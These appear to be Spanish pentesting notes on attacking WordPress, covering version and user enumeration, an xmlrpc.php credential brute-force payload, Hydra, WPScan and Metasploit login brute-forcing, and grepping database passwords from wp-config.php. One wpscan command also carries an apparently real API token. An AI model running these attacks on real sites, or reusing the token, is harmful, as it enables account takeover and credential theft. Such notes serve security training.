# Wordpress

https://github.com/vavkamil/dvwp

### **🕵️ Identificación de la versión de WordPress y sus componentes**

**Reconocimiento de servicios en WordPress**

```
nmap -sV --script http-wordpress-enum <url> # Detección de la versión de WordPress y plugins.
nmap -sV --script "http-wordpress* and not http-wordpress-brute" <url> # Escaneo de vulnerabilidades en WordPress.
nmap -sV --script http-wordpress-users <url> # Enumeración de usuarios de WordPress.
nmap --script=http-wordpress-enum --script-args http-wordpress-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar el uso de WordPress.
nmap --script=http-vuln* -p 80,443 <url> # Detección de vulnerabilidades específicas en WordPress y sus plugins.
```

También podemos intentar enumerar plugins con la herramienta _curl_:

```
curl -s -X GET "http://192.168.100.50" | grep -oP 'plugins/\K.*' | sort -u
```

> Es importante verificar automáticamente ciertos directorios durante cualquier escaneo de WordPress.

**✔️ Checklist de WordPress**

🎯 Para comprobar si existe un panel de inicio de sesión:

* url/wp-admin/login.php
* url/wp-admin/wp-login.php
* url/wp-login.php

🎯 Otros directorios clave a revisar en cualquier sitio web:

* url/robots.txt
* url/sitemap.xml
* url/CHANGELOG.txt
*   Cuando hayamos logrado la intrusión:

    ```
    cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    ```

> Si al acceder al servicio web notamos que no carga correctamente, es posible que se esté utilizando Virtual Hosting. En este caso, deberemos añadir el dominio al que apunta realmente en nuestro archivo **/etc/hosts**. Para ello, agregamos la IP de la web junto con el dominio correspondiente, por ejemplo: `10.0.0.10 wordpress.htb`.

```
whatweb <url>
```

para listar la version, en el caso de que sea inferior a la 4.7.1 tenemos capacidad de enumerar usuarios

En el caso de que este por defecto, pone el nombre del autor del wordpress, con author=1, en el caso de posibles nuevos usuairos podemos probar con author=2 etc. Esto nos da la posibilidad de listar usuarios

Tambien se pueden listar usuarios validos debido a que el mensaje de error te muestra si el usuario existe

```
searchsploit  wordpress user enumeration
```

podemos autenticarnos en wpscan.com para generar un api token y que asi no muestre la información detallada

en ==wp-conten/plugings/== es posible que tengamos hacer directory listing

para enumerar credenciales validas en el caso de que este activo el archivo: buscar en google abusing xmlrpc.php (nitesculucian.github)

```
http://127.0.0.1:31337/xmlrpc.php
```

en el caso de que nos deje mandar peticiones por post podemos enviar este contenido por post

```
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

nos guardamos este archivo en file.xml para tramitar la peticion por post con formato xml:

```
curl -s - X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml
```

podemos probar, en el caso de que esto de una salida para probar que funciona realmente

```
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
  <methodName>demo.sayHello</methodName> 
  <params></params> 
</methodCall>

```

ataques de fuerza bruta a

```
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
  <methodName>wp.getUsersBlogs</methodName> 
  <params> 
    <param>
      <value><string>usuario_real</string></value>
    </param> 
    <param>
      <value><string>contraseña_real</string></value>
    </param> 
  </params> 
</methodCall>
```

esto no tiene restriccion de solicitudes por defecto, por lo que la fuerza bruta es "sencilla"

## archivos importantes de worpress

wp-config.php wp-settings.php wp-content.php wp-admin.php

#### **🛠️ Escaneo básico de WordPress con Metasploit**

```
use auxiliary/scanner/http/wordpress_version # Cargar el módulo.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

#### **🕵️ Enumeración de usuarios en WordPress**

```
use auxiliary/scanner/http/wordpress_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

#### **🔑 Ataque de fuerza bruta con Metasploit**

```
set RHOSTS <url>
set USERNAME <nombre_usuario> # Nombre de usuario objetivo.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Diccionario de contraseñas.
exploit
```

#### **🛠️ Otras herramientas para auditar WordPress**

**🔹 WPScan**

**WPScan** es una herramienta especializada en la enumeración y auditoría de sitios basados en **WordPress**. Permite detectar vulnerabilidades, usuarios, plugins y temas instalados.

```
wpscan -U admin -p <wordlist> --url <url>
```

para contraseñas:

```
wpscan --url <url> --passwords /usr/share/whordlists/rockyou.txt
```

```
wpscan --url http://127.0.0.1:31337 -e vp,u --api-token=wfa6sqKqsrUwf0gPJ9ro3VtucrCf2iAYSjffRbsc1Gk
```

```
wpscan --url <url_wordpress> # Análisis básico de WordPress.
wpscan --url <url_wordpress> -e vp,u # Enumeración de plugins vulnerables y usuarios.
wpscan --url <url_wordpress> -e t # Enumeración de temas instalados.
```

> 💡 Una buena práctica durante la auditoría de WordPress es revisar el código fuente de la página. Allí podemos encontrar rutas como `/uploads`, analizar si hay _directory listing_, identificar temas, plugins y posibles filtraciones de información (_information leakage_), vhosts, entre otros.

> 💡 También es recomendable examinar publicaciones de blogs u otras secciones del sitio web en busca de nombres de usuario que puedan ser utilizados en ataques de fuerza bruta.

Si encontramos nombres de usuario potenciales, debemos almacenarlos en un archivo **.txt** para su posterior análisis o uso como _wordlist_.

#### **🔑 Fuerza bruta en el panel de inicio de sesión de WordPress**

**Ataque de fuerza bruta con WPScan**

```
wpscan --url <url/wp-login.php> -U <username> -P /usr/share/wordlists/rockyou.txt # Uso de diccionario de contraseñas.
wpscan --url <url/wp-login.php> --passwords <ruta_diccionario.txt> --usernames <ruta_usuarios.txt> # Ataque con múltiples usuarios.
```

**Ataque de fuerza bruta con Hydra**

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

Ataque a múltiples usuarios:

```
hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
```

🏁 Con estos métodos, podemos identificar la versión de WordPress utilizada, detectar plugins y temas instalados, analizar directorios sensibles, localizar paneles de acceso y ejecutar ataques de fuerza bruta para intentar obtener acceso al sistema.

> 💡credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress:

```
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```
